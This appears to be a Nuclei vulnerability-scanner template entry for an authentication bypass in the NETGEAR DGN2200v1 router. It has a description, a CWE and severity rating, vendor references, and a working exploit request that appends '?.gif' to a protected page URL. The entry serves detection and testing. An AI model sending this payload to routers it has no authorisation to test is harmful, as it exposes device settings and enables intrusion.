# Nuclei Template: NETGEAR DGN2200v1 - Authentication Bypass
**Template ID:** netgear-router-auth-bypass
**Vulnerability Class:** Improper Authentication - Generic
**Severity:** High
**CWE:** CWE-287
**Source:** Nuclei Template (`netgear-router-auth-bypass.yaml`)

## Vulnerability Information & PoC

## Description
NETGEAR DGN2200v1 router contains an authentication bypass vulnerability. It does not require authentication if a page has ".jpg", ".gif", or "ess_" substrings but matches the entire URL. Any page on the device can therefore be accessed, including those that require authentication, by appending a GET variable with the relevant substring.

## Steps to reproduce / Exploit Payload
```http
GET /WAN_wan.htm?.gif HTTP/1.1
Host: {{Hostname}}
Accept: */*

GET /WAN_wan.htm?.gif HTTP/1.1
Host: {{Hostname}}
Accept: */*
```

## References
- https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/
- https://kb.netgear.com/000062646/Security-Advisory-for-Multiple-HTTPd-Authentication-Vulnerabilities-on-DGN2200v1
